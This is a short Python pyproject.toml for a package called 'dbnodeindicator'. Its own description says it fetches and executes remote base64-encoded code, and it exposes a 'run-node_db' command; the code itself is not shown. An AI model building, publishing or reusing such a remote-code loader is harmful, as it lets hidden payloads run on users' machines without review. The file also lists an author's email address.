[project]
name = "dbnodeindicator"
version = "0.1.0"
description = "A tool that fetches and executes remote base64 code"
authors = [{ name="malcolm", email="malcolmbeck723@gmail.com" }]
license = {text = "MIT"}
readme = "README.md"
requires-python = ">=3.8"
dependencies = [
    "requests"
]

[project.scripts]
run-node_db = "dbnodeindicator.core:node_db"

[build-system]
requires = ["setuptools", "wheel"]
build-backend = "setuptools.build_meta"
